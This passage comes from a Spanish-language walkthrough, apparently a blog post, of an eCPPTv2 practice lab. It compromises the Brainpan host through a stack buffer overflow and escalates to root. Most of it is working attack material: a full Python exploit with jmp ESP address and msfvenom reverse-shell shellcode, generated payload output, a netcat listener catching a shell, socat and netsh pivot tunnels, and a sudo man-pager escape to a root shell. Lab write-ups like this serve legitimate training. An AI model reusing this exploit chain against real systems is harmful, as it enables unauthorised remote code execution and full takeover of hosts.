"\x83\x18\x48\x6c\x29\xe3\x1b\x53\x06\xea\x4f\x3b\x55\xec"
"\x6e\x07\xd0\x0a\x1a\x67\xb5\x85\xb3\x1e\x9c\x5d\x25\xde"
"\x0a\x18\x65\x54\xb9\xdd\x28\x9d\xb4\xcd\xdd\x6d\x83\xaf"
"\x48\x71\x39\xc7\x17\xe0\xa6\x17\x51\x19\x71\x40\x36\xef"
"\x88\x04\xaa\x56\x23\x3a\x37\x0e\x0c\xfe\xec\xf3\x93\xff"
"\x61\x4f\xb0\xef\xbf\x50\xfc\x5b\x10\x07\xaa\x35\xd6\xf1"
"\x1c\xef\x80\xae\xf6\x67\x54\x9d\xc8\xf1\x59\xc8\xbe\x1d"
"\xeb\xa5\x86\x22\xc4\x21\x0f\x5b\x38\xd2\xf0\xb6\xf8\xf2"
"\x12\x12\xf5\x9a\x8a\xf7\xb4\xc6\x2c\x22\xfa\xfe\xae\xc6"
"\x83\x04\xae\xa3\x86\x41\x68\x58\xfb\xda\x1d\x5e\xa8\xdb"
"\x37";
```

Como en el Buffer Overflow de la máquina Linux necesitamos saber qué dirección aplica el salto al ESP. Sabiendo que el Op. code de la instrucción `jmp ESP` es `FFE4` y con la ayuda de mona usando la instrucción `!mona find -s "\xFF\xE4" -m brainpan.exe` nos revela la dirección que buscamos, en este caso `0x311712f3`. Continuamos modificando script

<img src="/assets/VH/eCPPTv2-Lab/esp.png">

```python
#!/usr/bin/python3

import socket
from struct import pack

offset = 524
before_eip = b"A" * offset
eip = pack("<I", 0x311712f3) # jmp ESP

shellcode = (b"\xbb\x8f\x7a\x95\xab\xdb\xc8\xd9\x74\x24\xf4\x58\x29\xc9"
b"\xb1\x52\x31\x58\x12\x83\xe8\xfc\x03\xd7\x74\x77\x5e\x1b"
b"\x60\xf5\xa1\xe3\x71\x9a\x28\x06\x40\x9a\x4f\x43\xf3\x2a"
b"\x1b\x01\xf8\xc1\x49\xb1\x8b\xa4\x45\xb6\x3c\x02\xb0\xf9"
b"\xbd\x3f\x80\x98\x3d\x42\xd5\x7a\x7f\x8d\x28\x7b\xb8\xf0"
b"\xc1\x29\x11\x7e\x77\xdd\x16\xca\x44\x56\x64\xda\xcc\x8b"
b"\x3d\xdd\xfd\x1a\x35\x84\xdd\x9d\x9a\xbc\x57\x85\xff\xf9"
b"\x2e\x3e\xcb\x76\xb1\x96\x05\x76\x1e\xd7\xa9\x85\x5e\x10"
b"\x0d\x76\x15\x68\x6d\x0b\x2e\xaf\x0f\xd7\xbb\x2b\xb7\x9c"
b"\x1c\x97\x49\x70\xfa\x5c\x45\x3d\x88\x3a\x4a\xc0\x5d\x31"
b"\x76\x49\x60\x95\xfe\x09\x47\x31\x5a\xc9\xe6\x60\x06\xbc"
b"\x17\x72\xe9\x61\xb2\xf9\x04\x75\xcf\xa0\x40\xba\xe2\x5a"
b"\x91\xd4\x75\x29\xa3\x7b\x2e\xa5\x8f\xf4\xe8\x32\xef\x2e"
b"\x4c\xac\x0e\xd1\xad\xe5\xd4\x85\xfd\x9d\xfd\xa5\x95\x5d"
b"\x01\x70\x39\x0d\xad\x2b\xfa\xfd\x0d\x9c\x92\x17\x82\xc3"
b"\x83\x18\x48\x6c\x29\xe3\x1b\x53\x06\xea\x4f\x3b\x55\xec"
b"\x6e\x07\xd0\x0a\x1a\x67\xb5\x85\xb3\x1e\x9c\x5d\x25\xde"
b"\x0a\x18\x65\x54\xb9\xdd\x28\x9d\xb4\xcd\xdd\x6d\x83\xaf"
b"\x48\x71\x39\xc7\x17\xe0\xa6\x17\x51\x19\x71\x40\x36\xef"
b"\x88\x04\xaa\x56\x23\x3a\x37\x0e\x0c\xfe\xec\xf3\x93\xff"
b"\x61\x4f\xb0\xef\xbf\x50\xfc\x5b\x10\x07\xaa\x35\xd6\xf1"
b"\x1c\xef\x80\xae\xf6\x67\x54\x9d\xc8\xf1\x59\xc8\xbe\x1d"
b"\xeb\xa5\x86\x22\xc4\x21\x0f\x5b\x38\xd2\xf0\xb6\xf8\xf2"
b"\x12\x12\xf5\x9a\x8a\xf7\xb4\xc6\x2c\x22\xfa\xfe\xae\xc6"
b"\x83\x04\xae\xa3\x86\x41\x68\x58\xfb\xda\x1d\x5e\xa8\xdb"
b"\x37")

payload = before_eip + eip + b"\x90"*16 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.145", 9999))
s.send(payload)
s.close()
```

Vamos a probar el script. Nos ponemos en escuha en el puerto 443, arrancamos el binario brainpan.exe en la máquina Windows 7 y ejecutamos script

```bash
#ATACANTE
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.148] from (UNKNOWN) [192.168.1.145] 50007
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
win-jd2comgj58m\yorch
```

Hemos ganado acceso a la máquina Windows 7 por lo que comprobamos que funciona correctamente. Ahora tenemos que trasladar este concepto a la máquina Brainpan. Para ello debemos cambiar el shellcode para que la máquina Brainpan envíe la reverse shell a su nodo más cercano que es la Matrix y redirigir la petición por los túneles hasta nuestra máquina atacante. Generamos nuevo shellcode y sustituimos en el script

```bash
❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.15.12.130 LPORT=1346 -f c -b "\x00"  EXITFUNC=thread
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xb8\x56\x3f\x93\xe7\xdb\xd9\xd9\x74\x24\xf4\x5e\x2b\xc9"
"\xb1\x12\x31\x46\x12\x83\xc6\x04\x03\x10\x31\x71\x12\xad"
"\x96\x82\x3e\x9e\x6b\x3e\xab\x22\xe5\x21\x9b\x44\x38\x21"
"\x4f\xd1\x72\x1d\xbd\x61\x3b\x1b\xc4\x09\xb6\xd4\x3a\x4b"
"\xae\xe8\x42\x4e\x6d\x64\xa3\xe0\x17\x26\x75\x53\x6b\xc5"
"\xfc\xb2\x46\x4a\xac\x5c\x37\x64\x22\xf4\xaf\x55\xeb\x66"
"\x59\x23\x10\x34\xca\xba\x36\x08\xe7\x71\x38";
```

Seguimos creando los túneles correspondientes

```bash
#MATRIX
root@porteus:/tmp# ./socat TCP-LISTEN:1346,fork TCP:172.18.0.130:1347

#DUMBLEDORE
C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=1347 listenaddress=0.0.0.0 connectport=1348 connectaddress=192.168.100.129

#NAGINI
root@Nagini:/tmp# ./socat TCP-LISTEN:1348,fork TCP:10.10.0.134:1349

#ARAGOG
root@Aragog:/tmp# ./socat TCP-LISTEN:1349,fork TCP:192.168.1.148:443
```

Nos ponemos en escucha en el puerto 443 y ejecutamos el script a través de proxychains

<img src="/assets/VH/eCPPTv2-Lab/brainpanpwned.png">

### Escalada de Privilegios (Brainpan)

* * *

Listamos privilegios de sudo del usuario `puck` y vemos que podemos ejecutar el binario `anansi_util` como root sin proporcionar contraseña. Lo ejecutamos y vemos que nos permite abrir el manual de cualquier binario

```bash
puck@brainpan:/home/puck$ sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```

Abrimos el manual de `whoami` y nos abre el manual en modo paginated por lo que con `!/bin/bash` escapamos del contexto de man y nos abre una shell con privilegios de root. La flag la encontramos en el directorio `/root`

<img src="/assets/VH/eCPPTv2-Lab/man.png">

```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual whoami
No manual entry for manual
root@brainpan:/usr/share/man# whoami
root
root@brainpan:/usr/share/man# cd /root
root@brainpan:~# ls
b.txt
root@brainpan:~# cat b.txt 
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


                                              http://www.techorganic.com 

```

Hemos completado el laboratiorio de simulación del examen del eCPPTv2!!! Happy Hacking!!

<img src="/assets/VH/eCPPTv2-Lab/obsidian.png">